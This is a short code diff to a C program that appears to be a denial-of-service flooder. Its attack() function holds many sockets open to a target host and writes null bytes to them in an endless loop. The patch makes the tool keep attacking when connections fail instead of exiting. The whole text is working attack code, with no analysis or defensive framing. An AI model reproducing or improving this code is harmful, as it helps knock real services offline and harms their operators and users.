@@ -36,8 +36,8 @@ int make_socket(char *host, char *port) {
 	if(p == NULL) {
 		if(servinfo)
 			freeaddrinfo(servinfo);
-		fprintf(stderr, "No connection could be made\n");
-		exit(0);
+		fprintf(stderr, "No connection could be made, we will try next time\n");
+		return 0;
 	}
 	if(servinfo)
 		freeaddrinfo(servinfo);
@@ -60,8 +60,12 @@ void attack(char *host, char *port, int id) {
 	signal(SIGPIPE, &broke);
 	while(1) {
 		for(x=0; x != CONNECTIONS; x++) {
-			if(sockets[x] == 0)
+			if(sockets[x] == 0) {
 				sockets[x] = make_socket(host, port);
+				if(sockets[x] == 0) {
+					continue;
+				}
+			}
 			r=write(sockets[x], "\0", 1);
 			if(r == -1) {
 				close(sockets[x]);
